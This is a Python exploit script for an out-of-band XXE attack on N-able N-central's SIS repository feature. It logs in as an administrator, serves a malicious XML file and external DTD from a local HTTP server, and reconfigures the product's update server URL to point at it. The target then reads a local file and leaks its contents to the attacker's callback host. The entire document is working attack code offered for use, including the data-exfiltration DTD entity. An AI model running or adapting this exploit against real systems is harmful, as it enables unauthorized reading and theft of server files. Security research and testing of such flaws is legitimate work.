#!/usr/bin/env python3
import argparse
import getpass
import html
import os
import queue
import re
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

import requests
import urllib3


events = queue.Queue()
repository = b""
dtd = b""


class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        events.put((self.client_address[0], self.path, self.headers.get("User-Agent", "")))
        if self.path.startswith("/repo/Repository.xml"):
            body = repository
        elif self.path.startswith("/external.dtd"):
            body = dtd
        else:
            body = b"ok"
        self.send_response(200)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *_):
        pass


def field(body, name):
    tag = re.search(rf'<input[^>]+name=["\']{re.escape(name)}["\'][^>]*>', body, re.I)
    value = re.search(r'value=["\']([^"\']*)["\']', tag.group(0), re.I) if tag else None
    return html.unescape(value.group(1) if value else "")


def main():
    global repository, dtd
    p = argparse.ArgumentParser(description="N-central SIS Repository.xml XXE")
    p.add_argument("--target", default="https://192.168.1.14:8443")
    p.add_argument("--username", default="productadmin@n-able.com")
    p.add_argument("--password", default=os.getenv("PRODUCTADMIN_PASSWORD"))
    p.add_argument("--listen-host", default="0.0.0.0")
    p.add_argument("--callback-host", required=True)
    p.add_argument("--port", type=int, default=8001)
    p.add_argument("--file", default="/etc/hostname")
    a = p.parse_args()
    password = a.password or getpass.getpass("Password: ")
    repository = f'''<?xml version="1.0"?>
<!DOCTYPE repository SYSTEM "http://{a.callback_host}:{a.port}/external.dtd">
<repository>&leak;<item type="GenericFiles" timestamp="1" signature="1" signal="false"/></repository><abort>'''.encode()
    dtd = (
        f'<!ENTITY % file SYSTEM "file://{a.file}">\n'
        f'<!ENTITY % send "<!ENTITY leak SYSTEM \'http://{a.callback_host}:{a.port}/leak?value=%file;\'>">\n'
        "%send;\n"
    ).encode()
    server = ThreadingHTTPServer((a.listen_host, a.port), Handler)
    threading.Thread(target=server.serve_forever, daemon=True).start()

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    target = a.target.rstrip("/")
    s = requests.Session()
    s.verify = False
    s.get(target + "/login", timeout=30)
    login = s.post(
        target + "/loginLoginAction.action",
        data={"username": a.username, "password": password, "customerId": "1", "soName": ""},
        allow_redirects=False,
        timeout=30,
    )
    if login.status_code != 302:
        raise SystemExit(f"login={login.status_code}")
    headers = {"X-Requested-With": "XMLHttpRequest", "ncentralTabId": "sis"}
    s.get(target + "/IndexAction.action", timeout=30)
    s.get(
        target + "/refreshNavAction.action",
        headers=headers,
        params={"ncentralTabId": "sis", "custId": "1", "custName": "System"},
        timeout=30,
    )
    definition = s.get(
        target + "/definitionFileUpdateProcessAction.action",
        headers=headers,
        params={"ncentralTabId": "sis"},
        timeout=60,
    )
    original = {
        "url": field(definition.text, "customeServerAddress"),
        "interval": field(definition.text, "pollingInterval"),
        "enabled": bool(re.search(r'name=["\']enablePolling["\'][^>]+checked=', definition.text, re.I)),
    }

    def save(url, interval, enabled):
        return s.post(
            target + "/saveFileUpdateProcessAction.action",
            headers=headers,
            data={
                "ncentralTabId": "sis",
                "enablePolling": "true" if enabled else "false",
                "__checkbox_enablePolling": "true",
                "pollingInterval": interval,
                "customeServerAddress": url,
                "serverAddress": "-1",
            },
            timeout=180,
        )

    try:
        response = save(f"http://{a.callback_host}:{a.port}/repo", original["interval"], original["enabled"])
        print(f"login={login.status_code}")
        print(f"save={response.status_code}")
        for _ in range(3):
            client, path, agent = events.get(timeout=30)
            print(f"callback={client} {path} {agent}")
    finally:
        save(original["url"], original["interval"], original["enabled"])
        server.shutdown()


if __name__ == "__main__":
    main()
